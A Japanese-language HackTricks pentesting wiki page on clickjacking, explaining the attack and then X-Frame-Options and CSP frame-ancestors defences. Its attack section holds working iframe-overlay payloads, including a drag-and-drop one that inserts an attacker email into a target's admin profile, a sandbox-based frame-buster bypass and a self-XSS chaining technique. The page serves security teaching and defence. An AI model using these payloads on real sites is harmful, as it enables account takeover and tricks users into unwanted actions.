# Clickjacking

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で**最も進んだ**コミュニティツールによって動力を供給される**ワークフローを簡単に構築し自動化する**。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Clickjackingとは

Clickjackingは、**ユーザー**が**見えない**または別の要素に偽装されたウェブページの**要素をクリックする**ように**だます**攻撃です。これにより、ユーザーは知らず知らずのうちにマルウェアをダウンロードしたり、悪意のあるウェブページを訪れたり、認証情報や機密情報を提供したり、お金を送金したり、オンラインで製品を購入することがあります。(こちらから[here](https://www.imperva.com/learn/application-security/clickjacking/))。

### フォームを事前に埋めるトリック

ページをロードする際にGETパラメータを使用してフォームのフィールドの値を**入力することが可能な場合**があります。攻撃者はこの振る舞いを悪用して、任意のデータでフォームを埋め、ユーザーが送信ボタンを押すようにclickjackingペイロードを送信することができます。

### ドラッグ＆ドロップでフォームを埋める

ユーザーに**フォームを埋める**ように求める必要があるが、特定の情報（あなたが知っているメールアドレスや特定のパスワードなど）を直接書いてもらいたくない場合は、[**この例**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)のように、あなたがコントロールするデータを書き込む何かを**ドラッグ＆ドロップ**してもらうだけで済みます。

### 基本的なペイロード
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### マルチステップペイロード
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### ドラッグ＆ドロップ + クリックペイロード
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + クリックジャッキング

**ユーザーがクリックする必要があるXSS攻撃を特定した場合**、そのページが**クリックジャッキングに対して脆弱**であれば、ユーザーをだましてボタンやリンクをクリックさせることができます。\
例：\
_アカウントのプライベートな詳細（**自分だけが設定して読むことができる詳細**）に**セルフXSS**を見つけました。これらの詳細を設定するための**フォーム**があるページが**クリックジャッキング**に対して**脆弱**であり、GETパラメーターで**フォーム**を**事前に入力**することができます。_\
\_\_攻撃者は、そのページに対して**クリックジャッキング**攻撃を準備し、**フォーム**に**XSSペイロード**を**事前に入力**し、**ユーザー**をだましてフォームを**送信**させることができます。したがって、**フォームが送信され**値が変更されると、**ユーザーはXSSを実行します**。

## クリックジャッキングを避ける方法

### クライアント側の防御

クリックジャッキングを防ぐために、クライアント側で以下のいずれか、またはすべての動作を実行するスクリプトを実行することが可能です：

* 現在のアプリケーションウィンドウがメインまたはトップウィンドウであることを確認し、強制する、
* すべてのフレームを可視化する、
* 不可視のフレーム上でのクリックを防ぐ、
* ユーザーに対する潜在的なクリックジャッキング攻撃を検出し、フラグを立てる。

#### バイパス

フレームバスターはJavaScriptであるため、ブラウザのセキュリティ設定によってはその動作が防がれる可能性がありますし、ブラウザがJavaScriptをサポートしていない可能性もあります。フレームバスターに対する効果的な攻撃者の回避策は、**HTML5 iframe `sandbox` 属性**を使用することです。これが `allow-forms` または `allow-scripts` の値で設定され、`allow-top-navigation` の値が省略されている場合、iframeは自身がトップウィンドウかどうかを確認できないため、フレームバスタースクリプトを無効化することができます：
```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
```markdown
`allow-forms`と`allow-scripts`の値はiframe内で指定されたアクションを許可しますが、トップレベルナビゲーションは無効です。これにより、フレームバスティングの動作を防ぎながら、対象サイト内の機能を許可します。

クリックジャッキング攻撃のタイプによっては、`allow-same-origin`や`allow-modals`、[さらに多くの許可](https://www.w3schools.com/tags/att_iframe_sandbox.asp)が必要になることもあります。攻撃を準備する際には、ブラウザのコンソールをチェックしてください。他にどの動作を許可する必要があるかを教えてくれるかもしれません。

### X-Frame-Options

**`X-Frame-Options` HTTPレスポンスヘッダー**は、ブラウザがページを`<frame>`や`<iframe>`でレンダリングすることを**許可するかどうか**を示すために使用できます。サイトはこれを使用してクリックジャッキング攻撃を回避し、**自分のコンテンツが他のサイトに埋め込まれないように**します。HTMLコンテンツを含むすべてのレスポンスに**`X-Frame-Options`**ヘッダーを設定します。可能な値は以下の通りです：

* `X-Frame-Options: deny` は**どのドメインからもコンテンツのフレーミングを防ぎます** _(推奨値)_
* `X-Frame-Options: sameorigin` は**現在のサイトのみ**がコンテンツをフレームすることを許可します。
* `X-Frame-Options: allow-from https://trusted.com` は指定された'uri'がこのページをフレームすることを**許可します**。
* 下記の制限を確認してください。**ブラウザがサポートしていない場合は失敗します**。
* 他のブラウザは代わりに新しい**CSP frame-ancestorsディレクティブをサポートしています**。いくつかは両方をサポートしています。

### Content Security Policy (CSP) frame-ancestorsディレクティブ

**推奨されるクリックジャッキング保護**は、アプリケーションのContent Security Policyに**`frame-ancestors`ディレクティブ**を組み込むことです。\
**`frame-ancestors 'none'`**ディレクティブは、**X-Frame-Options `deny`**ディレクティブと同様の動作をします(_誰もページをフレームできません_)。\
**`frame-ancestors 'self'`**ディレクティブは、**X-Frame-Options `sameorigin`**ディレクティブとほぼ同等です(_現在のサイトのみがフレームできます_)。\
**`frame-ancestors trusted.com`**ディレクティブは、**X-Frame-Options** `allow-from`ディレクティブとほぼ同等です(_信頼できるサイトのみがフレームできます_)。

以下のCSPは同一ドメインのフレームのみをホワイトリストに登録します：

`Content-Security-Policy: frame-ancestors 'self';`

詳細およびより複雑な例については、以下のドキュメントを参照してください：

* [https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

### 制限事項 <a href="#limitations" id="limitations"></a>

* **ブラウザのサポート：** CSP frame-ancestorsはまだすべての主要ブラウザでサポートされていません。
* **X-Frame-Optionsが優先されます：** [CSP Specの"Relation to X-Frame-Options"セクション](https://w3c.github.io/webappsec/specs/content-security-policy/#frame-ancestors-and-frame-options)には、"_リソースが'frame-ancestors'というディレクティブを含むポリシーで配信され、その処分が'強制'である場合、X-Frame-Optionsヘッダーは無視されなければなりません_"とありますが、Chrome 40とFirefox 35はframe-ancestorsディレクティブを無視し、代わりにX-Frame-Optionsヘッダーに従います。

## 参考文献

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
世界で最も進んだコミュニティツールを駆使して**ワークフローを簡単に構築し自動化する**ために[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用してください。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローになる方法を学びましょう</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションです。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください**。

</details>
```
